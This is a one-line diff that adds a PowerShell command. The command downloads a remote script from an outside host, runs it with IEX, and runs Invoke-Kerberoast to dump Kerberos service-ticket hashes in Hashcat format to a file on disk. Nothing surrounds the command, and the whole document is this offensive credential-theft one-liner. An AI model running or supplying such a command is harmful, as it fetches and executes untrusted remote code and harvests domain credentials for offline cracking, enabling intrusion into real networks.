@@ -1,0 +1,1 @@
+IEX (Invoke-WebRequest 'http://jimrush.me/kb64.txt');Invoke-kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash | out-file -Encoding ASCII c:\temp\kerb.out
